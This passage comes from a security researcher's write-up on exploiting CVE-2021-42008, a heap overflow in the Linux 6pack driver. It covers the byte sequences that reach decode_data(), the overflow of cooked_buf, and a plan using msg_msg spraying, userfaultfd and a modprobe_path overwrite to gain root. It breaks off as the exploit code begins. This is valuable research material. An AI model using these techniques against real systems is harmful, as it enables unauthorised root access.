<h3 id="reaching-the-vulnerable-function">Reaching The Vulnerable Function</h3>

<p>Now that we can communicate with the <strong>sixpack</strong> driver, when we write to the ptmx, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L435">sixpack_receive_buf()</a> is called, which in turn calls <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L952">sixpack_decode()</a>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">sixpack_decode</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pre_rbuff</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">inbyte</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">count1</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">count1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count1</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">count1</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">inbyte</span> <span class="o">=</span> <span class="n">pre_rbuff</span><span class="p">[</span><span class="n">count1</span><span class="p">];</span> <span class="c1">// [1]
</span>		<span class="k">if</span> <span class="p">(</span><span class="n">inbyte</span> <span class="o">==</span> <span class="n">SIXP_FOUND_TNC</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">tnc_set_sync_state</span><span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">TNC_IN_SYNC</span><span class="p">);</span>
			<span class="n">del_timer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">resync_t</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">((</span><span class="n">inbyte</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_CMD_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [2]
</span>			<span class="n">decode_prio_command</span><span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">inbyte</span><span class="p">);</span>
		<span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">inbyte</span> <span class="o">&amp;</span> <span class="n">SIXP_STD_CMD_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [3]
</span>			<span class="n">decode_std_command</span><span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">inbyte</span><span class="p">);</span>
		<span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">&amp;</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">)</span> <span class="c1">// [4]
</span>			<span class="n">decode_data</span><span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">inbyte</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>The various macros are defined in <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c">6pack.c</a>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define SIXP_FOUND_TNC		0xe9
#define SIXP_PRIO_CMD_MASK	0x80
#define SIXP_PRIO_DATA_MASK	0x38
#define SIXP_RX_DCD_MASK	0x18
#define SIXP_DCD_MASK		0x08</span></code></pre></figure>

<p><strong>sixpack_decode()</strong> will loop through the buffer we sent over the sixpack channel, now stored in <strong>pre_rbuff</strong> <strong>[1]</strong>, and based on the value of each byte (<strong>inbyte</strong>), it will take different paths.
To reach the vulnerable function, <strong>decode_data()</strong>, we must force <strong>sixpack_decode()</strong> to take the last path <strong>[4]</strong> and to do so, we need to satisfy multiple conditions:</p>

<p><strong>A</strong>.  <code class="highlighter-rouge">inbyte &amp; SIXP_PRIO_CMD_MASK</code> must be zero, otherwise <strong>decode_prio_command()</strong> will be called instead of <strong>decode_data()</strong> <strong>[2]</strong>.</p>

<p><strong>B</strong>. <code class="highlighter-rouge">inbyte &amp; SIXP_STD_CMD_MASK</code> must be zero, otherwise <strong>decode_std_command()</strong> will be called instead of <strong>decode_data()</strong> <strong>[3]</strong>.</p>

<p><strong>C</strong>. <code class="highlighter-rouge">sp-&gt;status &amp; SIXP_RX_DCD_MASK</code> must be equal to <strong>SIXP_RX_DCD_MASK</strong> <strong>[4]</strong>.</p>

<p>Since we control the value of each byte in our buffer, the first two 
conditions can be easily satisfied. The most complex one to satisfy is <strong>C</strong>: <strong>sp-&gt;status</strong> corresponds to the <strong>status</strong> field of the <strong>sixpack</strong> structure associated with our tty. As we have seen before, when a <strong>sixpack</strong> structure is initialized by <strong>sixpack_open()</strong>, the <strong>status</strong> variable is set to <strong>1</strong>. Although we have no direct control over this variable, we can still indirectly modify it by taking the <strong>decode_prio_command()</strong> path <strong>[2]</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">decode_prio_command</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cmd</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">actual</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">((</span><span class="n">cmd</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [1]
</span>
		<span class="k">if</span> <span class="p">(((</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">&amp;</span> <span class="n">SIXP_DCD_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
			<span class="p">((</span><span class="n">cmd</span> <span class="o">&amp;</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [2]
</span>				<span class="k">if</span> <span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
					<span class="n">printk</span><span class="p">(</span><span class="n">KERN_DEBUG</span> <span class="s">"6pack: protocol violation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
				<span class="k">else</span>
					<span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">cmd</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">SIXP_RX_DCD_MASK</span><span class="p">;</span> <span class="c1">// [3]
</span>		<span class="p">}</span>
		<span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">cmd</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span><span class="p">;</span> <span class="c1">// [4]
</span>	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="cm">/* output watchdog char if idle */</span>

              <span class="p">[...]</span>

        <span class="p">}</span>

        <span class="p">[...]</span>
<span class="p">}</span></code></pre></figure>

<p>When <strong>decode_prio_command()</strong> is called, if we satisfy the first check <strong>[1]</strong>, we can get control over <strong>sp-&gt;status</strong> thanks to the line <code class="highlighter-rouge">sp-&gt;status = cmd &amp; SIXP_PRIO_DATA_MASK</code> <strong>[4]</strong>, which is exactly what we need since we control the value of <strong>cmd</strong>.</p>

<p>Now we have a problem: if the second check is satisfied <strong>[2]</strong>, the <strong>SIXP_RX_DCD_MASK</strong> bits are zeroed out from our <strong>cmd</strong> variable by the line <code class="highlighter-rouge">cmd &amp;= ~SIXP_RX_DCD_MASK</code> <strong>[3]</strong>, but since we need to satisfy condition <strong>C</strong> to reach the vulnerable function <strong>decode_data()</strong>, the second part of the second check <code class="highlighter-rouge">(cmd &amp; SIXP_RX_DCD_MASK) == SIXP_RX_DCD_MASK</code> <strong>[2]</strong> will be inevitably satisfied and the same applies to the first part of the check <code class="highlighter-rouge">(sp-&gt;status &amp; SIXP_DCD_MASK) == 0</code> since when we call <strong>decode_prio_command()</strong> for the first time, <strong>sp-&gt;status</strong> is equal to 1.</p>

<p>Fortunately, we can easily work around the problem by calling <strong>decode_prio_command()</strong> two times: The first time, we set <strong>sp-&gt;status</strong> to a value for which when we call <strong>decode_prio_command()</strong> again, the first part of the second check <code class="highlighter-rouge">(sp-&gt;status &amp; SIXP_DCD_MASK) == 0</code> <strong>[2]</strong> will not be satisfied. This way, calling <strong>decode_prio_command()</strong> again with a specific value as input, we will be able to skip the line <code class="highlighter-rouge">cmd &amp;= ~SIXP_RX_DCD_MASK</code> <strong>[3]</strong> and set <strong>sp-&gt;status</strong> to a value that can satisfy condition <strong>C</strong>.</p>

<p>The following python script will compute the correct bytes to use as input to achieve our goal:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">print</span><span class="p">(</span><span class="s">"[*] First call to decode_prio_command():"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">):</span>
	<span class="n">x</span> <span class="o">=</span> <span class="n">byte</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_CMD_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="c"># To call decode_prio_command()</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="c"># [1] in decode_prio_command()</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">:</span> <span class="c"># [2] in decode_prio_command()</span>
				<span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span> <span class="c"># [3] in decode_prio_command()</span>
				<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">"Input: {hex(byte)} =&gt; sp-&gt;status = {hex(x)}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
				<span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Second call to decode_prio_command():"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">):</span>
	<span class="n">x</span> <span class="o">=</span> <span class="n">byte</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_CMD_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="c"># To call decode_prio_command()</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="c"># [1] in decode_prio_command()</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIXP_RX_DCD_MASK</span><span class="p">:</span> <span class="c"># To reach decode_data()</span>
				<span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="n">SIXP_PRIO_DATA_MASK</span> <span class="c"># [3] in decode_prio_command()</span>
				<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">"Input: {hex(byte)} =&gt; sp-&gt;status = {hex(x)}"</span><span class="p">)</span>
				<span class="k">break</span></code></pre></figure>

<p>Executing the script above we will get the following result:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] First call to decode_prio_command():
Input: 0x88 =&gt; s-&gt;status = 0x8

[*] Second call to decode_prio_command():
Input: 0x98 =&gt; s-&gt;status = 0x18
</code></pre></div></div>

<p>It means that if we call <strong>decode_prio_command()</strong> the first time using <strong>0x88</strong> as input, <strong>sp-&gt;status</strong> will be set to <strong>0x8</strong>, then, calling the function again using <strong>0x98</strong> as input, the second check will not be satisfied <strong>[2]</strong> because <strong>sp-&gt;status</strong> will be equal to <strong>8</strong> and <code class="highlighter-rouge">(8 &amp; SIXP_DCD_MASK) != 0</code>, and we will be able skip the line <code class="highlighter-rouge">cmd &amp;= ~SIXP_RX_DCD_MASK</code> <strong>[3]</strong> and set <strong>sp-&gt;status</strong> to 0x18 thanks to the line <code class="highlighter-rouge">sp-&gt;status = cmd &amp; SIXP_PRIO_DATA_MASK</code> <strong>[4]</strong>.</p>

<p>At this point we can satisfy condition <strong>C</strong>, <code class="highlighter-rouge">(sp-&gt;status &amp; SIXP_RX_DCD_MASK) == SIXP_RX_DCD_MASK</code>, in <strong>sixpack_decode()</strong>, and reach the vulnerable function <strong>decode_data()</strong>. Let’s proceed examining its source code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">decode_data</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">inbyte</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sp</span><span class="o">-&gt;</span><span class="n">raw_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">inbyte</span><span class="p">;</span> <span class="c1">// [1]
</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">buf</span> <span class="o">=</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">raw_buf</span><span class="p">;</span> <span class="c1">// [2]
</span>	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
		<span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xc0</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
		<span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
		<span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">inbyte</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>For our discussion, we also need to take into account the following fields of the sixpack structure:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">sixpack</span> <span class="p">{</span>

	<span class="p">[...]</span>

	<span class="kt">unsigned</span> <span class="kt">char</span>		<span class="n">raw_buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="kt">unsigned</span> <span class="kt">char</span>		<span class="n">cooked_buf</span><span class="p">[</span><span class="mi">400</span><span class="p">];</span>

	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">rx_count</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">rx_count_cooked</span><span class="p">;</span>

	<span class="p">[...]</span>

	<span class="kt">unsigned</span> <span class="kt">char</span>		<span class="n">status</span><span class="p">;</span>

	<span class="p">[...]</span>
<span class="p">};</span></code></pre></figure>

<p>Every time <strong>decode_data()</strong> is called, one byte is copied from our buffer to <strong>sp-&gt;raw_buf</strong> <strong>[1]</strong>. When <strong>sp-&gt;raw_buf</strong> contains three bytes and <strong>decode_data()</strong> is called again, these three bytes are decoded and copied from <strong>sp-&gt;raw_buf</strong> to another buffer, <strong>sp-&gt;cooked_buf</strong> <strong>[2]</strong>. As we can see from the <strong>sixpack</strong> structure above, this buffer can contain a maximum of <strong>400</strong> bytes. The variable <strong>sp-&gt;rx_count_cooked</strong> is used as index in <strong>sp-&gt;cooked_buf</strong> and it is incremented after each byte is written into it.</p>

<p>From an attacker prospective, knowing that your payload will pass 
through this function, is not very reassuring. Luckily we can reuse some
 parts of the <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L794">encode_sixpack()</a> function in our exploit to encode our malicious input, this way, once received by <strong>sixpack_decode()</strong> our payload will be decoded by <strong>decode_data()</strong> and we will be able to control values in memory. Here is the <strong>encode_sixpack()</strong> part we are interested in:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">encode_sixpack</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tx_buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tx_buf_raw</span><span class="p">,</span>
	<span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tx_delay</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">[...]</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="n">length</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">((</span><span class="n">count</span> <span class="o">%</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="p">);</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x30</span><span class="p">);</span>
		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">count</span> <span class="o">%</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">);</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="p">]</span> <span class="o">=</span>	<span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3c</span><span class="p">);</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">);</span>
			<span class="n">tx_buf_raw</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="p">[...]</span>

	<span class="k">return</span> <span class="n">raw_count</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now that we know how to reach the vulnerable function, we can finally start planning our exploit!</p>

<h3 id="the-exploitation-plan">The Exploitation Plan</h3>

<p>The first thing to consider is the layout of the <strong>sixpack</strong> structure in memory. Let’s take a look to its source code again:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">sixpack</span> <span class="p">{</span>

	<span class="p">[...]</span>

	<span class="kt">unsigned</span> <span class="kt">char</span>		<span class="n">raw_buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="kt">unsigned</span> <span class="kt">char</span>		<span class="n">cooked_buf</span><span class="p">[</span><span class="mi">400</span><span class="p">];</span> <span class="c1">// [1]
</span>
	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">rx_count</span><span class="p">;</span> <span class="c1">// [2]
</span>	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">rx_count_cooked</span><span class="p">;</span> <span class="c1">// [3]
</span>
	<span class="p">[...]</span>
<span class="p">};</span></code></pre></figure>

<p>As we can see, if we manage to overflow the <strong>cooked_buf</strong> buffer <strong>[1]</strong>, we will inevitably overwrite the <strong>rx_count</strong> variable <strong>[2]</strong> and the <strong>rx_count_cooked</strong> variable <strong>[3]</strong> in memory. Here is a visual representation:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/1.png" alt=""></p>

<p>Since we know that <strong>rx_count_cooked</strong> is used as index inside <strong>cooked_buf</strong> by <strong>decode_data()</strong>, if we do the math correctly, we can use the overflow to set it to a large value, this way we should be able to trick <strong>decode_data()</strong> into continuing to write into the next object in memory.</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/2.png" alt=""></p>

<p>Now, assuming we can achieve this goal, we need an object that we can spray in <strong>kmalloc-4096</strong>,
 and once corrupted by our Out-Of-Bounds Write primitive, can give us 
powerful primitives, such as arbitrary read and arbitrary write. At this
 point, if you have read my latest article, you already know that <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/msg.h#L9">msg_msg</a> is exactly what we need:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">msg_msg</span> <span class="p">{</span>
	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">m_list</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">m_type</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">m_ts</span><span class="p">;</span> <span class="c1">// [1]
</span>	<span class="k">struct</span> <span class="n">msg_msgseg</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span> <span class="c1">// [2]
</span>	<span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
	<span class="cm">/* the actual message follows immediately */</span>
<span class="p">};</span></code></pre></figure>

<p>In our recent articles, <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">Fire Of Salvation</a> and <a href="https://syst3mfailure.io/wall-of-perdition">Wall Of Perdition</a>, <a href="https://www.willsroot.io/">FizzBuzz101</a> and me, have extensively discussed how to utilize <strong>msg_msg</strong>
 objects to achieve arbitrary read and arbitrary write in the Linux 
Kernel. Before continuing, I recommend you to read these articles to 
better understand how this object can be exploited. I will continue this
 discussion assuming you already know how <strong>msg_msg</strong> objects can be used in kernel exploitation.</p>

<p>If we manage to get a <strong>msg_msg</strong> object allocated right after the <strong>sixpack</strong> structure, and the respective segment allocated in <strong>kmalloc-32</strong>, we can corrupt the <strong>m_ts</strong>
 field of the message (which determines its size) with our Out-Of-Bounds
 Write primitive, setting it to a large value. This way, using <a href="https://linux.die.net/man/2/msgrcv">msgrcv()</a> in user space to read the message, we should be able to obtain a powerful Out-Of-Bounds Read primitive in <strong>kmalloc-32</strong>, get a memory leak and bypass <strong>KASLR</strong>.</p>

<p>We can do something similar to achieve an arbitrary write primitive. We can spray many <strong>msg_msg</strong> objects in <strong>kmalloc-4096</strong> and their respective segments in <strong>kmalloc-32</strong>, then for each object we hang the call to <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/uaccess.h#L189">copy_from_user()</a> in <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/ipc/msgutil.c#L84">load_msg()</a> using <a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/userfaultfd.html">userfaultfd</a> (there are alternatives to <strong>userfaultfd</strong>, we will discuss them in the Conclusion section). Afterwards, once one of these messages is allocated right after our <strong>sixpack</strong> structure, we corrupt its <strong>next</strong> pointer, setting it to the address where we want to write. In our exploit, we will use <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">modprobe_path</a>, but there are many other valid targets, for example the <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/cred.h#L111">cred</a> structure of the current task, as we have done with <strong>Wall Of Perdition</strong>. Once we release the <strong>copy_from_user()</strong> calls, we should be able to replace the <strong>modprobe_path</strong> string (set by default to <strong>“/sbin/modprobe”</strong>)
 with the path of a binary controlled by us, and trick the kernel into 
executing the malicious program that will give us root privileges.</p>

<p>At this point, with this plan in mind, we are ready to start writing our exploit!</p>

<h3 id="the-exploit">The Exploit</h3>

<p>First of all we need to do some calculations to get the distance between <strong>sp-&gt;cooked_buf</strong> and <strong>sp-&gt;rx_count_cooked</strong>, and the distance between <strong>sp-&gt;cooked_buf</strong> and the next object in memory. In our case, the address of <strong>sp-&gt;rx_count_cooked</strong> corresponds to <strong>sp-&gt;cooked_buf[0x194]</strong> and the address of the next object in memory corresponds to <strong>sp-&gt;cooked_buf[0x688]</strong>. Since we know that <strong>sp-&gt;rx_count_cooked</strong> is used as index inside <strong>sp-&gt;cooked_buf</strong> , if we want to write to the next object in memory, we need to set its value to <strong>x</strong>, where  <strong>x &gt;= 0x688</strong>.
 The problem seems straightforward to solve, but we need to take in 
consideration the effect of GCC optimizations on the vulnerable function
 <strong>decode_data()</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">decode_data</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">inbyte</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

        <span class="p">[...]</span>

	<span class="n">buf</span> <span class="o">=</span> <span class="n">sp</span><span class="o">-&gt;</span><span class="n">raw_buf</span><span class="p">;</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
		<span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xc0</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
